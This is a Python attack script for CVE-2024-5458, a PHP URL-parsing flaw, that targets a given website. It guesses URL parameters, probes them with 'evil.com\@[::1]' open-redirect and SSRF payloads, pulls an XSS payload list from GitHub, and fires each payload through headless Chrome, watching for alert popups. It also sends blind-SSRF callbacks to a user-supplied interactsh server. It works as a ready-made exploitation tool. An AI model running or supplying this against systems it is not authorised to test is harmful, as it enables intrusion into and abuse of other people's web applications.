# PHP versions 7.3.27 - 7.3.33, 7.4.15 - 7.4.33, 8.0.2 - 8.0.30, 8.1.0 - 8.1.28, 8.2.0 - 8.2.19, 8.3.0 - 8.3.7

# Regex:
# ^7\.3\.(2[7-9]|3[0-3])$|^7\.4\.(1[5-9]|2[0-9]|3[0-3])$|^8\.0\.(2|[3-9]|1[0-9]|2[0-9]|3[0])$|^8\.1\.(0|[1-9]|1[0-9]|2[0-8])$|^8\.2\.(0|[1-9]|1[0-9])$|^8\.3\.(0|[1-7])$

# Open Redirection & Server Side Request Forgery & Cross-Site Scripting


import requests
import sys
import logging
import urllib3
import selenium
import sys
import argparse
import subprocess
import os
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from threading import Lock
from urllib.parse import urlparse
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
from urllib.parse import urlparse




# Remove other errors
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.getLogger('WDM').setLevel(logging.ERROR)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


# Get xss payloads from file
def load_payloads(payload):
    with open(payload, "r") as file:
        return [line.strip() for line in file if line.strip()]
      

def create_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless") 
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-browser-side-navigation")
    chrome_options.add_argument("--disable-infobars")
    chrome_options.add_argument("--disable-notifications")
    chrome_options.page_load_strategy = 'eager'
    logging.disable(logging.CRITICAL)

    driver_service = Service(ChromeDriverManager().install())
    return webdriver.Chrome(service=driver_service, options=chrome_options)

# Create drive pool and lock for using multi-thread 
def get_driver():
    try:
        return driver_pool.get_nowait()
    except:
        with driver_lock:
            return create_driver()


# Return driver pool
def return_driver(driver):
    driver_pool.put(driver)


def get_xss_wordlist():
    url = "https://raw.githubusercontent.com/coffinxp/loxs/refs/heads/main/payloads/xss.txt"
    
    try:
        response = requests.get(url)
        response.raise_for_status() 

        payloads = response.text.splitlines()  # 줄 단위로 나누기
        
        return payloads

    except requests.RequestException as e:
        print(f"Error occurred in progress of getting xss wordlist")
   
def create_wordlist(url):
    try:
        path = os.getcwd()
        ran = random.randint(1, 100000)
        file_path = os.path.join(path, "wordlist"+str(ran))
        
        try:
            with open(file_path, 'w') as file:
                print(f"\nCreating file in {file_path}...")
                time.sleep(1)
        except Exception:
            print(f"Error occured in progress of creating file")

        

        subprocess.run(
            ["cewler", "--output", f"{file_path}", url],
            check=True
        )
        
        with open(file_path, "r") as file:
            wordlist = [line.strip() for line in file if line.strip()]
        
        return wordlist

    except subprocess.CalledProcessError as e:
        print("Error occured in progress of cewler:", e)
        return []
    except FileNotFoundError:
        print(f"Error: The output file was not found.")
        return []
     
    
parser = argparse.ArgumentParser(usage="""CVE-2024-5458.py -u https://target.com/""")
parser.add_argument('--URL', '-u', help='Target URL with parameter', required=True)
parser.add_argument('--custom', '-c', help='Use custom wordlist', action='store_true')
args = parser.parse_args()

driver_pool = Queue()
driver_lock = Lock()

#Parsing URL as host
parsed_url = urlparse(args.URL)
host = parsed_url.netloc   

if args.custom:
    wordlist = input("\nPut your URL parameter wordlist: ")
    payload_file =  input("Put your xss payload wordlist: ")
    interactsh = input("Put your interactsh-url for Blind SSRF test: ")


    with open(wordlist, 'r') as file:
        for line in file:
            word = line.strip()  
            target_url = args.URL + "?" + word + "="  
            print("\n")
            print("-"*100)
            print(f"[O] Target parameter: {word}")
            
            try:
                test_urls = [f"https://evil.com\@[::1]", f"evil.com\@[::1]"]
                
                for test_url in test_urls:
                    print("\n[+] Testing URL => " + target_url + test_url)
                    
                    response = requests.get(target_url+test_url)
                    if response.status_code == 302 or "evil.com" in response.text:
                        print("[+] It is vulnerable to Open Redirection & SSRF")
                        choice = input("    [O] Do you want to test XSS more? (y/n): ").strip().lower()
                        
                        if choice == 'y':
                            driver = get_driver()
                            
                            try:
                                xss_payloads = load_payloads(payload_file)
                                
                                for xss_payload in xss_payloads:
                                    try:
                                        driver.get(target_url+xss_payload+"@[::1]")
                                        try:
                                            alert = WebDriverWait(driver, int("1")).until(EC.alert_is_present())
                                            alert_text = alert.text

                                            if alert_text:
                                                print("    [+] " + target_url+xss_payload+"@[::1]")
                                                alert.accept()
                                            else:
                                                print("    [-] " + target_url+xss_payload+"@[::1]")

                                        except TimeoutException:
                                            print("    [-] " + target_url+xss_payload+"@[::1]")

                                    except UnexpectedAlertPresentException:
                                        pass
                            finally:
                                return_driver(driver)
                                
                        elif choice == 'n':
                            print("[+] It is Open Redirection & SSRF response for further exploit!!\n")
                            print("[Response in raw type]")
                            print(response.text)
                            
                        else:
                            print("Invalid input. Please enter 'y' or 'n'")
                        
                    else:
                        print("[-] It is not vulnerable to Open Redirection & SSRF")
                        print("[+] Checking Blind SSRF....")
                        print("[+] Sending request for blind SSRf test. Check your server!!")
                        requests.get(target_url+f"{interactsh}\@[::1]")

                    
            except requests.RequestException:
                print("(!) Error occured in progress")
                sys.exit()

else:
    wordlist = create_wordlist(host)
    payloads = get_xss_wordlist()
    
    for word in wordlist:
        target_url = args.URL + "?" + word + "="  
        print("\n")
        print("-"*100)
        print(f"[O] Target parameter: {word}")
        
        try:
            test_urls = [f"https://evil.com\@[::1]", f"evil.com\@[::1]"]
            
            for test_url in test_urls:
                print("\n[+] Testing URL => " + target_url + test_url)
                response = requests.get(target_url+test_url)
                if response.status_code == 302 or "evil.com" in response.text:
                    print("\n[+] Detected Vulnerability : True")
                    sys.exit()
                else:
                    driver = get_driver()
                    try:                    
                        for payload in payloads:
                            try:
                                driver.get(target_url+payload+"@[::1]")
                                try:
                                    alert = WebDriverWait(driver, int("1")).until(EC.alert_is_present())
                                    alert_text = alert.text

                                    if alert_text:
                                        print("\n[+] Detected Vulnerability : True")
                                        alert.accept()
                                        sys.exit()
                                    else:
                                        print("[-] Detected Vulnerability : False")

                                except TimeoutException:
                                    print("[-] Detected Vulnerability : False")

                            except UnexpectedAlertPresentException:
                                pass
                    finally:
                        return_driver(driver)
        except requests.RequestException:
            print("[!] Error occured in progress")
            sys.exit()